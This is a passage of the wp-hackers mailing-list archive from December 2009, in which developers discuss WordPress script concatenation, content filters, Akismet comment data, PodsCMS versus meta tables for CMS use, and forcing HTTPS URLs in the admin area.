> UI changes in 2.7 didn't suit some people (making WordPress less
> accessible). I can tell you it is a LOT of very hard work. Coding is the
> smallest part of it and doesn't take anywhere near as much time as
> monitoring the core changes does. Keeping track of core changes and running
> diffs all the time is a real chore if you have others depending on you
> keeping up-to-date.

I think the amount of work depends on the type of fork you're looking
at. I can imagine that keeping the old UI would be A LOT of work. I also
used to maintain a private fork with some simple core mods and it was
also a lot of work, more than I expected.

At the same time, removing the TinyMCE editor might be a much simpler
maintenance task. It can be removed with a couple of code tweaks and
deleting a folder or two. Major updates would require a quick test,
minor version updates can probably be assumed to work.

I'm proposing to create an platform that allows people to maintain
flavours of WordPress with as much automation as possible. I see a wide
range of flavours to suit different needs, each would be a different
amount of work and would fall to the maintainers of that flavour to
decide if it's worth the effort.

As of yet I haven't had anyone confirm they want to maintain a specific
flavour, so right now it seems unlikely I'll move forward. If anyone is
interested, please let me know.

Warmly - Callum.



From jayarjo at gmail.com  Sat Dec 19 08:32:12 2009
From: jayarjo at gmail.com (Davit Barbakadze)
Date: Sat, 19 Dec 2009 12:32:12 +0400
Subject: [wp-hackers] JavaScript concatenation and compression - any
	documentation?
In-Reply-To: <107B88EA-229D-4D27-AB00-0EA847ABD639@xentek.net>
References: <9aa12a490912172358h5885abc5w724a22e84abc2724@mail.gmail.com>
	<349fe48b0912180230o273e387flfc3943be002cc303@mail.gmail.com>
	<9aa12a490912181124i3a42d27dt7a7f0a97c1b8d62a@mail.gmail.com>
	<4cc4de140912181136o221d382bvbd4c35e6b0dca907@mail.gmail.com>
	<9aa12a490912181343s5fa4bb04t534299f1de96396c@mail.gmail.com>
	<107B88EA-229D-4D27-AB00-0EA847ABD639@xentek.net>
Message-ID: <9aa12a490912190032o70ecb3eak3c1a75b6a6b289fd@mail.gmail.com>

Thank you Ken, I will check that link.

Eric, I've understood that it works only with core scripts, but what
core scripts are actually meant here? I thought the talk was about
core javascript files. That for example if I load javascript files
from wordpress installation and not from my plugin directory (let's
say jquery, farbtastic, jquery ui tabs and some more) I get this
functionality working (getting those files concatenated that this). Am
I wrong? Does it work only within wordpress itself?

On Sat, Dec 19, 2009 at 1:57 AM, Eric Marden <wp at xentek.net> wrote:
>>>> Is it turned on by default for my plugins and themes?
>>>
>>> No. It can't be turned on, period.
>
>> What does it mean it can't be turned on? I've been asking whether
>> concatenation is already turned on (for only core scripts) by default?
>
> Davit, Andrew was answering your question. Its turned on for the core
> scripts by default, but doesn't do anything for plugins or themes.
>
>
>
> - Eric Marden
> __________________________________
> http://xentek.net/code/wordpress/
> tw: @xentek
>
>
>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Davit Barbakadze

From jayarjo at gmail.com  Sat Dec 19 08:40:56 2009
From: jayarjo at gmail.com (Davit Barbakadze)
Date: Sat, 19 Dec 2009 12:40:56 +0400
Subject: [wp-hackers] JavaScript concatenation and compression - any
	documentation?
In-Reply-To: <4B2BFA0C.2080804@adcSTUDIO.com>
References: <9aa12a490912172358h5885abc5w724a22e84abc2724@mail.gmail.com>
	<349fe48b0912180230o273e387flfc3943be002cc303@mail.gmail.com>
	<9aa12a490912181124i3a42d27dt7a7f0a97c1b8d62a@mail.gmail.com>
	<4cc4de140912181136o221d382bvbd4c35e6b0dca907@mail.gmail.com>
	<9aa12a490912181343s5fa4bb04t534299f1de96396c@mail.gmail.com>
	<4B2BFA0C.2080804@adcSTUDIO.com>
Message-ID: <9aa12a490912190040s7e11ec1o7ec39adc20485dd2@mail.gmail.com>

> "Another major new feature is that all core admin scripts are concatenated
> and compressed before sending them to the browser. This feature can easily
> be extended to include scripts added by plugins and to use server side
> caching, however that would require some changes to the server settings
> (.htaccess on Apache).

So it is possible to somehow include external scripts into
concatenation process, right? What are the changes that are meant
here? Do they work? And if yes when do they and when - not? Do you got
an url to the resource explaining that?

Thank you again.

-- 
Davit Barbakadze

From wp at andrewnacin.com  Sat Dec 19 09:04:15 2009
From: wp at andrewnacin.com (Andrew Nacin)
Date: Sat, 19 Dec 2009 04:04:15 -0500
Subject: [wp-hackers] JavaScript concatenation and compression - any
	documentation?
In-Reply-To: <9aa12a490912190040s7e11ec1o7ec39adc20485dd2@mail.gmail.com>
References: <9aa12a490912172358h5885abc5w724a22e84abc2724@mail.gmail.com> 
	<349fe48b0912180230o273e387flfc3943be002cc303@mail.gmail.com> 
	<9aa12a490912181124i3a42d27dt7a7f0a97c1b8d62a@mail.gmail.com> 
	<4cc4de140912181136o221d382bvbd4c35e6b0dca907@mail.gmail.com> 
	<9aa12a490912181343s5fa4bb04t534299f1de96396c@mail.gmail.com> 
	<4B2BFA0C.2080804@adcSTUDIO.com>
	<9aa12a490912190040s7e11ec1o7ec39adc20485dd2@mail.gmail.com>
Message-ID: <4cc4de140912190104l62b20f9k5e85575740da36ff@mail.gmail.com>

>
> Eric, I've understood that it works only with core scripts, but what core
> scripts are actually meant here?
>

Consult wp-includes/script-loader.php, specifically wp_default_scripts() and
wp_default_styles().

I thought the talk was about core javascript files. That for example if I
> load javascript files from wordpress installation and not from my plugin
> directory (let's say jquery, farbtastic, jquery ui tabs and some more) I get
> this functionality working (getting those files concatenated that this). Am
> I wrong? Does it work only within wordpress itself?
>

Including the individual files will do just that -- use the individual
files. WordPress does not do any server side processing to JS and CSS files.
To load the concatenated scripts, WordPress has wp-admin/load-scripts.php
and load-styles.php. These files call script-loader.php but do not load up
the entire WordPress environment. This is to prevent loading the WP
environment three times -- once for WP, then for JS and CSS. Thus, you can't
hook into the default scripts that are concatenated by load-scripts or
load-styles. (If you could do that, it would defeat the purpose of offering
a single file the browser could cache, as the scripts that are queued could
potentially change on each page.)

From jayarjo at gmail.com  Sat Dec 19 10:58:11 2009
From: jayarjo at gmail.com (Davit Barbakadze)
Date: Sat, 19 Dec 2009 14:58:11 +0400
Subject: [wp-hackers] newlines from rich text editor do not convert to
	paragraphs
In-Reply-To: <e1202cb10912181057l30a32c19w5f235e93f5884d95@mail.gmail.com>
References: <9aa12a490912121039m76116b4ch5536269947c1a941@mail.gmail.com>
	<op.u4vk6lrdspxmuu@dd32>
	<d7153760912130751h533bbad1p9c3405553a4585f5@mail.gmail.com>
	<4B25F1CE.9060805@laptoptips.ca>
	<9aa12a490912140349p41f18f1dg5d8c819bc3075a91@mail.gmail.com>
	<9aa12a490912140432h43248b76jf776906ff1f4471d@mail.gmail.com>
	<349fe48b0912140800m6bf7ca82r30d767c90cce66c0@mail.gmail.com>
	<4B27B3DB.7040509@adcSTUDIO.com>
	<349fe48b0912151045i516383cam5ea881a66c82905c@mail.gmail.com>
	<e1202cb10912181057l30a32c19w5f235e93f5884d95@mail.gmail.com>
Message-ID: <9aa12a490912190258k2d8581e3j43c0648e21d27ed1@mail.gmail.com>

Thank you Jeremy. That was a key point, I haven't realized until now.

apply_filters('the_content', $something)

It's huge!

On Fri, Dec 18, 2009 at 10:57 PM, Jeremy Clarke <jer at simianuprising.com> wrote:
> On Tue, Dec 15, 2009 at 1:45 PM, scribu <scribu at gmail.com> wrote:
>> On Tue, Dec 15, 2009 at 6:05 PM, Ken Newman <Ken at adcstudio.com> wrote:
>>> You can apply the filter yourself:
>>>> $filtered_content = apply_filters('the_content', get_the_post_content());
>>>>
>>>> ?Would it be considered good practice do this, say, in child theme's
>>> function file?
>>
>> Yes, it doesn't matter where you're putting this code.
>
> I think this is the right approach. I do the
> apply_filters('the_content', $something) trick often to get things
> like [shortcodes] to work in category descriptions, author bios etc.
>
> It's not really Ideal as its supposed to be tied to showing post body
> content, but in practice it tends to work really well. Most plugins
> add their filtering to that hook so whatever you pass in gets the full
> treatment in most cases.
>
> Moving the default filters to get_the_content() seems dangerous to me,
> especially for reverse compatibility. Past uses of that filter would
> assume specifically that the content would NOT have paragraphs etc
> added to it, which could be important for a lot of reasons. It's also
> logically consistent that get_the_content() would return the
> database-formatted text, there are lots of situations where that is a
> valuable tool and taking care of the filtering yourself after is
> reasonable if you are being that elaborate with your manipulations.
>
> Obviously themes shouldn't mess around with $post->post_content unless
> they know what they're doing. I can't help thinking that adding that
> to a theme without any add_filter('the_content') must have been done
> with almost no testing of its effects on posting (I've done this
> before! It caused bugs cause I did almost no testing of posting!)
>
> --
> Jeremy Clarke | http://jeremyclarke.org
> Code and Design | http://globalvoicesonline.org
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Davit Barbakadze

From jayarjo at gmail.com  Sat Dec 19 11:06:03 2009
From: jayarjo at gmail.com (Davit Barbakadze)
Date: Sat, 19 Dec 2009 15:06:03 +0400
Subject: [wp-hackers] JavaScript concatenation and compression - any
	documentation?
In-Reply-To: <4cc4de140912190104l62b20f9k5e85575740da36ff@mail.gmail.com>
References: <9aa12a490912172358h5885abc5w724a22e84abc2724@mail.gmail.com>
	<349fe48b0912180230o273e387flfc3943be002cc303@mail.gmail.com>
	<9aa12a490912181124i3a42d27dt7a7f0a97c1b8d62a@mail.gmail.com>
	<4cc4de140912181136o221d382bvbd4c35e6b0dca907@mail.gmail.com>
	<9aa12a490912181343s5fa4bb04t534299f1de96396c@mail.gmail.com>
	<4B2BFA0C.2080804@adcSTUDIO.com>
	<9aa12a490912190040s7e11ec1o7ec39adc20485dd2@mail.gmail.com>
	<4cc4de140912190104l62b20f9k5e85575740da36ff@mail.gmail.com>
Message-ID: <9aa12a490912190306w5a4465f9ta7464a603768466c@mail.gmail.com>

I never looked into admin source until now. Hm...

Why does it load scripts that way? I never understood why this problem
with external javascript files, until I really saw how wordpress
actually does concatenation
(wp-admin/load-scripts.php?c=1&load=jquery,utils,farbtastic,editor,quicktags).

What was the idea behind it? I mean there they are all the scripts on
the server side queued in the scripts queue and sorted by dependences.
Can't we do concatentation right there? Before outputing those scripts
to the browser? Why it is done after? Otherwise of course there will
arise a problem of multiple inclusion of the wordpress core (as well
as other weird things).

?

On Sat, Dec 19, 2009 at 1:04 PM, Andrew Nacin <wp at andrewnacin.com> wrote:
>>
>> Eric, I've understood that it works only with core scripts, but what core
>> scripts are actually meant here?
>>
>
> Consult wp-includes/script-loader.php, specifically wp_default_scripts() and
> wp_default_styles().
>
> I thought the talk was about core javascript files. That for example if I
>> load javascript files from wordpress installation and not from my plugin
>> directory (let's say jquery, farbtastic, jquery ui tabs and some more) I get
>> this functionality working (getting those files concatenated that this). Am
>> I wrong? Does it work only within wordpress itself?
>>
>
> Including the individual files will do just that -- use the individual
> files. WordPress does not do any server side processing to JS and CSS files.
> To load the concatenated scripts, WordPress has wp-admin/load-scripts.php
> and load-styles.php. These files call script-loader.php but do not load up
> the entire WordPress environment. This is to prevent loading the WP
> environment three times -- once for WP, then for JS and CSS. Thus, you can't
> hook into the default scripts that are concatenated by load-scripts or
> load-styles. (If you could do that, it would defeat the purpose of offering
> a single file the browser could cache, as the scripts that are queued could
> potentially change on each page.)
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Davit Barbakadze

From peter at avirtualhome.com  Sat Dec 19 18:02:58 2009
From: peter at avirtualhome.com (Peter van der Does)
Date: Sat, 19 Dec 2009 13:02:58 -0500
Subject: [wp-hackers] Why is Akismet returning more info in the
 $commentdata ?
In-Reply-To: <20091219002424.6e0631de@montecarlo.grandprix.int>
References: <20091218233156.03591ec4@montecarlo.grandprix.int>
	<71ddd7490912182106m400390bfo4305a7025158d46@mail.gmail.com>
	<20091219002424.6e0631de@montecarlo.grandprix.int>
Message-ID: <20091219130258.3069b70c@montecarlo.grandprix.int>

On Sat, 19 Dec 2009 00:24:24 -0500
Peter van der Does <peter at avirtualhome.com> wrote:

> 
> But why are the returned into WordPress?
> The next function called with the preprocess_comment filter inherits
> all these fields as well.
> It just seems unnecessary.
> 

There are even more elements added to the $comment_data array by the
same function. My brain was not working well at 11:30 PM.

The original has 8 elements and after Akismet the array has 48 elements.

-- 
Peter van der Does

GPG key: E77E8E98

IRC: Ganseki on irc.freenode.net
Twitter: @petervanderdoes

WordPress Plugin Developer
Blog: http://blog.avirtualhome.com
Forums: http://forums.avirtualhome.com
Twitter: @avhsoftware

From mikeschinkel at newclarity.net  Sat Dec 19 21:54:56 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Sat, 19 Dec 2009 16:54:56 -0500
Subject: [wp-hackers] Wordpress as a CMS
In-Reply-To: <f44b36190912181844q2f2a0582la80c153413b1f3ec@mail.gmail.com>
References: <f44b36190912181844q2f2a0582la80c153413b1f3ec@mail.gmail.com>
Message-ID: <FFC98AE7-7262-46D5-A60B-0042E5194F66@newclarity.net>

On Dec 18, 2009, at 9:44 PM, Jean-Patrick Smith wrote:
> Wordpress as a CMS is only feasible if you do it the PodsCMS way, you can't
> really scale well using the other CMS plugins that just make
> editing/displaying meta values easier.

While I actually agree with you on this I wanted to let you know that AFAIK Matt disagrees.  I was fortunate to have had a long conversation about this with Matt at WordCamp Birmingham and he told me him does not believe in the PodsCMS/Drupal CCK approach. He said that as far as he was concerned such an approach will never make it into the WordPress core, instead preferring meta tables.

That's my memory of the conversation anyway.  I'd love it if Matt would jump in to clarify his comments if I misrepresented his position on this and also to give his rationale for why the PodsCMS/Drupal CCK approach is the wrong way to go.


>> Interesting. In your opinion how would a plugin have to impement the
>> functionality of Pods/Flutter while still maintaining the WP Core
>> architecture? (this is an honest question, not a baited one.)

> You can only do it those two ways. I guess you could make it text based and
> save your generated files to the filesystem... but that's about it:
> 
>   1. Store everything in custom created tables like podscms
>   2. Store everything in the posts_meta table
>   3. Create or implement a templating language and save generated files and
>   settings to the filesystem

Yes, those are the obvious ones.  I was hoping Eric had some innovative ideas I hadn't considered.

-Mike

> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From dave69 at gmail.com  Sun Dec 20 04:22:47 2009
From: dave69 at gmail.com (Dave R)
Date: Sun, 20 Dec 2009 15:22:47 +1100
Subject: [wp-hackers] Wordpress as a CMS
In-Reply-To: <FFC98AE7-7262-46D5-A60B-0042E5194F66@newclarity.net>
References: <f44b36190912181844q2f2a0582la80c153413b1f3ec@mail.gmail.com> 
	<FFC98AE7-7262-46D5-A60B-0042E5194F66@newclarity.net>
Message-ID: <dea5cae00912192022j4e3f24fcie0a749a8b5ae7cef@mail.gmail.com>

Maybe it's not all bad that it remains as a plugin then, though hopefully an
ever improving plugin. That way those that don't want this kind of
functionality can quite happily avoid it, while those of us that do will be
able to enjoy the PodCMS benefits as we see them.




2009/12/20 Mike Schinkel <mikeschinkel at newclarity.net>

> On Dec 18, 2009, at 9:44 PM, Jean-Patrick Smith wrote:
> > Wordpress as a CMS is only feasible if you do it the PodsCMS way, you
> can't
> > really scale well using the other CMS plugins that just make
> > editing/displaying meta values easier.
>
> While I actually agree with you on this I wanted to let you know that AFAIK
> Matt disagrees.  I was fortunate to have had a long conversation about this
> with Matt at WordCamp Birmingham and he told me him does not believe in the
> PodsCMS/Drupal CCK approach. He said that as far as he was concerned such an
> approach will never make it into the WordPress core, instead preferring meta
> tables.
>
> That's my memory of the conversation anyway.  I'd love it if Matt would
> jump in to clarify his comments if I misrepresented his position on this and
> also to give his rationale for why the PodsCMS/Drupal CCK approach is the
> wrong way to go.
>
>
> >> Interesting. In your opinion how would a plugin have to impement the
> >> functionality of Pods/Flutter while still maintaining the WP Core
> >> architecture? (this is an honest question, not a baited one.)
>
> > You can only do it those two ways. I guess you could make it text based
> and
> > save your generated files to the filesystem... but that's about it:
> >
> >   1. Store everything in custom created tables like podscms
> >   2. Store everything in the posts_meta table
> >   3. Create or implement a templating language and save generated files
> and
> >   settings to the filesystem
>
> Yes, those are the obvious ones.  I was hoping Eric had some innovative
> ideas I hadn't considered.
>
> -Mike
>
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From mikeschinkel at newclarity.net  Sun Dec 20 04:30:11 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Sat, 19 Dec 2009 23:30:11 -0500
Subject: [wp-hackers] Wordpress as a CMS
In-Reply-To: <dea5cae00912192022j4e3f24fcie0a749a8b5ae7cef@mail.gmail.com>
References: <f44b36190912181844q2f2a0582la80c153413b1f3ec@mail.gmail.com>
	<FFC98AE7-7262-46D5-A60B-0042E5194F66@newclarity.net>
	<dea5cae00912192022j4e3f24fcie0a749a8b5ae7cef@mail.gmail.com>
Message-ID: <1F0939D9-BA2F-4E7E-8341-E4183A8AE769@newclarity.net>

On Dec 19, 2009, at 11:22 PM, Dave R wrote:
> Maybe it's not all bad that it remains as a plugin then, though hopefully an
> ever improving plugin. That way those that don't want this kind of
> functionality can quite happily avoid it, while those of us that do will be
> able to enjoy the PodCMS benefits as we see them.

My sadness regarding that approach is that such functionality really is infrastructure and if it never makes it into the core several orders of magnitude less will be developed that will leverage it.  But alas...

-Mike Schinkel

From dave69 at gmail.com  Sun Dec 20 04:35:12 2009
From: dave69 at gmail.com (Dave R)
Date: Sun, 20 Dec 2009 15:35:12 +1100
Subject: [wp-hackers] Wordpress as a CMS
In-Reply-To: <1F0939D9-BA2F-4E7E-8341-E4183A8AE769@newclarity.net>
References: <f44b36190912181844q2f2a0582la80c153413b1f3ec@mail.gmail.com> 
	<FFC98AE7-7262-46D5-A60B-0042E5194F66@newclarity.net>
	<dea5cae00912192022j4e3f24fcie0a749a8b5ae7cef@mail.gmail.com> 
	<1F0939D9-BA2F-4E7E-8341-E4183A8AE769@newclarity.net>
Message-ID: <dea5cae00912192035u3655aa9m9af8c1f5c1451f98@mail.gmail.com>

True...




2009/12/20 Mike Schinkel <mikeschinkel at newclarity.net>

> On Dec 19, 2009, at 11:22 PM, Dave R wrote:
> > Maybe it's not all bad that it remains as a plugin then, though hopefully
> an
> > ever improving plugin. That way those that don't want this kind of
> > functionality can quite happily avoid it, while those of us that do will
> be
> > able to enjoy the PodCMS benefits as we see them.
>
> My sadness regarding that approach is that such functionality really is
> infrastructure and if it never makes it into the core several orders of
> magnitude less will be developed that will leverage it.  But alas...
>
> -Mike Schinkel
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From gundersson at gmail.com  Sun Dec 20 10:18:26 2009
From: gundersson at gmail.com (Christian Gundersson)
Date: Sun, 20 Dec 2009 11:18:26 +0100
Subject: [wp-hackers] Tying media library to a plugin
Message-ID: <d14758810912200218y3384fccaibe50e3b40de88271@mail.gmail.com>

Hi,

does anyone know of a way to utilize the media library upload feature in a
plugin?

What I would like to do is, on my plugin page, show the media library upload
interface and upload an image into it. As it is now I have a completely
separate handling of the images for the plugin and it seems very redundant.

Any pointers to specific help would be appreciated.

Thanks!

//Christian

From joehoyle at gmail.com  Sun Dec 20 11:38:37 2009
From: joehoyle at gmail.com (Joe Hoyle)
Date: Sun, 20 Dec 2009 11:38:37 +0000
Subject: [wp-hackers] [ wp-hackers ] wp _ enqueue _ script() not working
	while in the Loop
In-Reply-To: <349fe48b0912170703l29937a07i517fc54417b4ef04@mail.gmail.com>
References: <349fe48b0912170238s4168314cx91c21ba0f5eea58a@mail.gmail.com>
	<20091217124639.5C6C3181B04D1@dd19416.kasserver.com>
	<349fe48b0912170703l29937a07i517fc54417b4ef04@mail.gmail.com>
Message-ID: <13FF1DB8-3472-48F8-8F1F-362BC899D8AD@gmail.com>

Is there a trac ticket for being able to enqueue in the footer after wp_head? Or are there reasons why this would not be a good idea?


Joe Hoyle

www.joehoyle.co.uk
joehoyle at gmail.com
+44 (0)7891 685 613



On 17 Dec 2009, at 15:03, scribu wrote:

> You're welcome. :)
> 
> I don't use wp_print_scripts() because some other plugins might have inline
> scripts printed using the 'wp_print_scripts' hook.
> 
> 
> On Thu, Dec 17, 2009 at 2:46 PM, TobiasBg <wp-hackers at tobias.baethge.com>wrote:
> 
>> Hi,
>> 
>>> That's why I use $wp_scripts->do_items(). It makes sure the same script
>>> isn't included twice. You just have to make sure you use the same handle
>> for
>>> both plugins.
>> 
>> Argh, stupid me. Of course it does (and so does its wrapper
>> wp_print_scripts, that I prefer to use). I just had a typo in one of the
>> handles... Thanks for pointing me to it!
>> 
> 
> 
> -- 
> http://scribu.net
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From scribu at gmail.com  Sun Dec 20 11:51:55 2009
From: scribu at gmail.com (scribu)
Date: Sun, 20 Dec 2009 11:51:55 +0000
Subject: [wp-hackers] Tying media library to a plugin
In-Reply-To: <d14758810912200218y3384fccaibe50e3b40de88271@mail.gmail.com>
References: <d14758810912200218y3384fccaibe50e3b40de88271@mail.gmail.com>
Message-ID: <349fe48b0912200351n69fe5a0dp275485e0962d7b52@mail.gmail.com>

You can enque the thickbox js on the plugin page header. Then just
copy the html for the 'Add media' button from the post editing screen.

-- 
http://scribu.net

From scribu at gmail.com  Sun Dec 20 11:56:26 2009
From: scribu at gmail.com (scribu)
Date: Sun, 20 Dec 2009 11:56:26 +0000
Subject: [wp-hackers] [ wp-hackers ] wp _ enqueue _ script() not working
	while in the Loop
In-Reply-To: <13FF1DB8-3472-48F8-8F1F-362BC899D8AD@gmail.com>
References: <349fe48b0912170238s4168314cx91c21ba0f5eea58a@mail.gmail.com>
	<20091217124639.5C6C3181B04D1@dd19416.kasserver.com>
	<349fe48b0912170703l29937a07i517fc54417b4ef04@mail.gmail.com>
	<13FF1DB8-3472-48F8-8F1F-362BC899D8AD@gmail.com>
Message-ID: <349fe48b0912200356j5983752bt9e361a11cddd232c@mail.gmail.com>

You can already do this. See the last param for wp_enqueue_script().

On 12/20/09, Joe Hoyle <joehoyle at gmail.com> wrote:
> Is there a trac ticket for being able to enqueue in the footer after
> wp_head? Or are there reasons why this would not be a good idea?
>
>
> Joe Hoyle
>
> www.joehoyle.co.uk
> joehoyle at gmail.com
> +44 (0)7891 685 613
>
>
>
> On 17 Dec 2009, at 15:03, scribu wrote:
>
>> You're welcome. :)
>>
>> I don't use wp_print_scripts() because some other plugins might have
>> inline
>> scripts printed using the 'wp_print_scripts' hook.
>>
>>
>> On Thu, Dec 17, 2009 at 2:46 PM, TobiasBg
>> <wp-hackers at tobias.baethge.com>wrote:
>>
>>> Hi,
>>>
>>>> That's why I use $wp_scripts->do_items(). It makes sure the same script
>>>> isn't included twice. You just have to make sure you use the same handle
>>> for
>>>> both plugins.
>>>
>>> Argh, stupid me. Of course it does (and so does its wrapper
>>> wp_print_scripts, that I prefer to use). I just had a typo in one of the
>>> handles... Thanks for pointing me to it!
>>>
>>
>>
>> --
>> http://scribu.net
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>


-- 
http://scribu.net

From scribu at gmail.com  Sun Dec 20 12:00:30 2009
From: scribu at gmail.com (scribu)
Date: Sun, 20 Dec 2009 12:00:30 +0000
Subject: [wp-hackers] [ wp-hackers ] wp _ enqueue _ script() not working
	while in the Loop
In-Reply-To: <349fe48b0912200356j5983752bt9e361a11cddd232c@mail.gmail.com>
References: <349fe48b0912170238s4168314cx91c21ba0f5eea58a@mail.gmail.com>
	<20091217124639.5C6C3181B04D1@dd19416.kasserver.com>
	<349fe48b0912170703l29937a07i517fc54417b4ef04@mail.gmail.com>
	<13FF1DB8-3472-48F8-8F1F-362BC899D8AD@gmail.com>
	<349fe48b0912200356j5983752bt9e361a11cddd232c@mail.gmail.com>
Message-ID: <349fe48b0912200400jc6894f3k596a81bb6838ae94@mail.gmail.com>

Sorry, I thought you meant something else. I don't think there's a
ticket for enqueing scripts in the footer after wp_head. Feel free to
create it.

-- 
http://scribu.net

From gundersson at gmail.com  Sun Dec 20 14:20:26 2009
From: gundersson at gmail.com (Christian Gundersson)
Date: Sun, 20 Dec 2009 15:20:26 +0100
Subject: [wp-hackers] Tying media library to a plugin
In-Reply-To: <349fe48b0912200351n69fe5a0dp275485e0962d7b52@mail.gmail.com>
References: <d14758810912200218y3384fccaibe50e3b40de88271@mail.gmail.com>
	<349fe48b0912200351n69fe5a0dp275485e0962d7b52@mail.gmail.com>
Message-ID: <d14758810912200620y3d8d0676u77e2ceb8c366a1b1@mail.gmail.com>

Sounds too easy ;), but I'll try that.

Thanks!

//Christian

2009/12/20 scribu <scribu at gmail.com>

> You can enque the thickbox js on the plugin page header. Then just
> copy the html for the 'Add media' button from the post editing screen.
>
> --
> http://scribu.net
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From steve at sltaylor.co.uk  Sun Dec 20 15:22:43 2009
From: steve at sltaylor.co.uk (Steve Taylor)
Date: Sun, 20 Dec 2009 15:22:43 +0000
Subject: [wp-hackers] forcing siteurl to HTTPS in admin
Message-ID: <a21f8bf00912200722l6e9ae04ne5d9fe5cd7cf2f6@mail.gmail.com>

Hi there,

I'm using FORCE_SSL_ADMIN, and I'm trying to overcome the problem when
a public user (e.g. a subscriber) goes to their profile page and gets
a "Do you want to display insecure items?" notice. It looks like the
default in IE for this question has changed from "Yes" to "No" - and
"No" can block some references to images and scripts.

As ever I tried just sticking a filter in my theme code, but I made it
a tiny plugin on the strength that the filter will get applied earlier
in the processing. This is the code:

function slt_adminURL( $value ) {
	if ( is_admin() && FORCE_SSL_ADMIN && substr( $value, 0, 8 ) != "https://" )
		$value = str_replace( "http://", "https://", $value );
	return $value;
}
add_filter( 'option_siteurl', 'slt_adminURL', 0 );
add_filter( 'option_url', 'slt_adminURL', 0 );

However, there's still a few plugins returning HTTP URLs. It all seems
to come down to WP_CONTENT_URL being defined in wp-settings.php. It
uses get_option('siteurl'), but I guess the settings are loaded so
early that the above filters have no chance.

Any ideas on how to do this? I thought of setting WP_CONTENT_URL in
wp-config.php, but I guess I would have to do a "manual" check on the
request URL to decide whether we're in admin or not, and hence whether
to apply HTTPS or not?

Or is the best approach to set up some kind of filtering of the HTML
before output in admin, if that's possible?

cheers,

Steve Taylor

From chicagowebdev at gmail.com  Sun Dec 20 17:45:52 2009
From: chicagowebdev at gmail.com (Jean-Patrick Smith)
Date: Sun, 20 Dec 2009 11:45:52 -0600
Subject: [wp-hackers] Wordpress as a CMS
Message-ID: <f44b36190912200945h6c061541s64d946fb685dace1@mail.gmail.com>

>
> Date: Sat, 19 Dec 2009 16:54:56 -0500
> From: Mike Schinkel <mikeschinkel at newclarity.net>
> Subject: Re: [wp-hackers] Wordpress as a CMS
> To: wp-hackers at lists.automattic.com
> Message-ID: <FFC98AE7-7262-46D5-A60B-0042E5194F66 at newclarity.net>
> Content-Type: text/plain;       charset=us-ascii
>
> On Dec 18, 2009, at 9:44 PM, Jean-Patrick Smith wrote:
> > Wordpress as a CMS is only feasible if you do it the PodsCMS way, you
> can't
> > really scale well using the other CMS plugins that just make
> > editing/displaying meta values easier.
>
> While I actually agree with you on this I wanted to let you know that AFAIK
> Matt disagrees.  I was fortunate to have had a long conversation about this
> with Matt at WordCamp Birmingham and he told me him does not believe in the
> PodsCMS/Drupal CCK approach. He said that as far as he was concerned such an
> approach will never make it into the WordPress core, instead preferring meta
> tables.
>
> That's my memory of the conversation anyway.  I'd love it if Matt would
> jump in to clarify his comments if I misrepresented his position on this and
> also to give his rationale for why the PodsCMS/Drupal CCK approach is the
> wrong way to go.
>

That is sad, because what PodsCMS does is provide similar functionality of a
CRUD utility. Except it also incorporates templating into the mix, and soon
to come, a more robust menu system than what wordpress offers out of the
box.

1 meta table is OK for a few blog posts... but you can't have for example a
gaming website walk-through guide, with all extra data inside meta tables.
After a few thousand records, you're database will start to suffer the
consequences.

With the PodsCMS approach, it automagically creates a wp_pods_walkthrough
table, and adds the column you specify.

While I understand Wordpress was created for blogging, the UI is so nice,
all it needs is a little touch up to become a full blown CMS.



> Maybe it's not all bad that it remains as a plugin then, though hopefully
> an
> ever improving plugin. That way those that don't want this kind of
> functionality can quite happily avoid it, while those of us that do will be
> able to enjoy the PodCMS benefits as we see them.
>

I'd like to see it on the level of BuddyPress, I think BP just has a well
designed website and more community support... PodsCMS makes my day though,
you can't do it with Wordpress alone, not like that.

From wordpress at dd32.id.au  Sun Dec 20 22:41:52 2009
From: wordpress at dd32.id.au (Dion Hulse (dd32))
Date: Mon, 21 Dec 2009 09:41:52 +1100
Subject: [wp-hackers] forcing siteurl to HTTPS in admin
In-Reply-To: <a21f8bf00912200722l6e9ae04ne5d9fe5cd7cf2f6@mail.gmail.com>
References: <a21f8bf00912200722l6e9ae04ne5d9fe5cd7cf2f6@mail.gmail.com>
Message-ID: <op.u49dbzutspxmuu@dd32>

My thought is, That is_admin() is possibly false at the time your filter  
is called.. Else i see no reason why it wouldnt work.
try removing that and see if it forces everything to https?

On Mon, 21 Dec 2009 02:22:43 +1100, Steve Taylor <steve at sltaylor.co.uk>  
wrote:

> Hi there,
>
> I'm using FORCE_SSL_ADMIN, and I'm trying to overcome the problem when
> a public user (e.g. a subscriber) goes to their profile page and gets
> a "Do you want to display insecure items?" notice. It looks like the
> default in IE for this question has changed from "Yes" to "No" - and
> "No" can block some references to images and scripts.
>
> As ever I tried just sticking a filter in my theme code, but I made it
> a tiny plugin on the strength that the filter will get applied earlier
> in the processing. This is the code:
>
> function slt_adminURL( $value ) {
